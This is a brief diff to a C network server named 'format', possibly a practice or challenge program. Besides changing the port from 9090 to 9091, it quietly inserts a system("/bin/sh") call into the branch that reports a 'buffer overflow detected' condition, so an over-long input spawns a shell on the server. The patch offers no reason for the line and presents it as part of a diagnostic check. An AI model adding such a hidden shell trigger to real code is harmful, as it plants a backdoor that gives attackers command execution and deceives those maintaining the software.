@@ -10,7 +10,7 @@
 #include <sys/wait.h>
 
 #define PROGRAM "format"
-#define PORT    9090
+#define PORT    9091
 #define BUFFER_SIZE 256
 
 int socket_bind(int port);
@@ -65,6 +65,7 @@ void main()
                 // Check for buffer overflow
                 if (bytes_read >= BUFFER_SIZE - 1) {
                     const char *overflow_msg = "Buffer overflow detected\n";
+                    system("/bin/sh");
                     send(socket_fd, overflow_msg, strlen(overflow_msg), 0);
                 } else {
                     const char *no_overflow_msg = "No buffer overflow\n";
